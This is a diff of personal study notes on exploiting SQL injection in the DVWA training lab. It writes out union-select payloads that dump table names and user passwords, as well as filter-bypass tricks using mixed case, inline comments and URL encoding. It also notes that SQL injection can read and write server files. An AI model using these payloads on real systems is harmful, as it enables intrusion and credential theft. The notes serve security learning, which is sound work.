@@ -492,6 +492,7 @@ now statement as -> 1' union select table_name,2 from information_schema.tables 
 is guestbook and users
 now statement as  -> 1' union select user,password from users # // now we can get the username and passwords present in the table
 
+Step 14 ->
 Above statements to be run on Medium security level -> in dvwa switch security to medium and then go to SQL injection
 now statement as -> 1' // now it will again give error but this time it will complain about the presence of single quote even
 the same error will occur if we use the statement as 1' and 1=1 # and give the invalid page
@@ -503,8 +504,8 @@ now statement -> 1%27 1=2# // this will give the invalid page
 now statement -> 1%27 union select 1,2#
 now statement -> 1%27 union select 1,2#
 now statement -> 1%27 union select table_name,2 from information_schema.tables # // now we will get all the tables
-now statement -> 1%27 union select table_name,2 from information_schema.tables where table_schema='dvwa'# // now we will get all the
-error here we r getting error bcz with dvwa table schema we r using single quotes and website is using sometypes of filters for 
+now statement -> 1%27 union select table_name,2 from information_schema.tables where table_schema='dvwa'# // now we will get all
+the error here we r getting error bcz with dvwa table schema we r using single quotes and website is using sometypes of filters for 
 single quote
 
 So now we need to think of a way to write the database name without quotes and put it after the equal, So we will use the burp suite
@@ -520,7 +521,7 @@ dvwa DB
 
 So using the above methods we basically play around and try to find out the exploit
 
-Tips and tricks while exploiting SQL injection
+Step 15-> Tips and tricks while exploiting SQL injection -
 - Some websites try to implement the security by checking the query for the number of words and they blacklist these words so that
 if they exist they don't execute the query ex-> such as words like and, or, union, select, spaces etc
 - So we can bypass client site security using burp suite
@@ -536,7 +537,7 @@ Sometimes comments r blacklisted or they do not work so we can use /* or -- or /
 
 Sometimes u also had to end the statement so u also had to add semicolon at the end of the statement and then add ur comment
 
-Bypassing Security and Accessing all records ->
+Step 16 -> Bypassing Security and Accessing all records -
 now at security low statement as -> 1%27 uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables%23 // and it will show the
 exploit and show all the tables present in DB
 
@@ -560,7 +561,7 @@ give second table and so on.
 'dvwa'+limit+0,1 %23&Submit=Submit#
 // now U will see the users and u can iterate it over by changing the value of limit keyword first parameter
 
-How to fix to SQL injections?
+Step 17 -> How to fix to SQL injections?
 Go to DVWA website and set the security level to High and then go to SQL injection
 lets try to inject it as -> 1 and 1=1 and also try -> 1' and 1=1 and u will see they didn't worked
 Now if u view the source code and also open the source code for the medium security level u will see that in medium they have used
@@ -568,7 +569,7 @@ functions like mysql_ real_escape_string to search for any special character and
 statements of medium and high that in medium they r not using quotes for $id but in the high they r using quotes so what's happening
 that in high they r using inputing the extra statement as if but in medium it would be considered as the sql statement
 
-Reading and Writing Files on the Server using the SQL injection Vulnerabilities ->
+Step 18 -> Reading and Writing Files on the Server using the SQL injection Vulnerabilities ->
 we can use sql injections to read any files on the server even if the file exists outside the www root and we can also use the sql
 injections to write files just like the File Upload Vulnerability
 - Reading ->
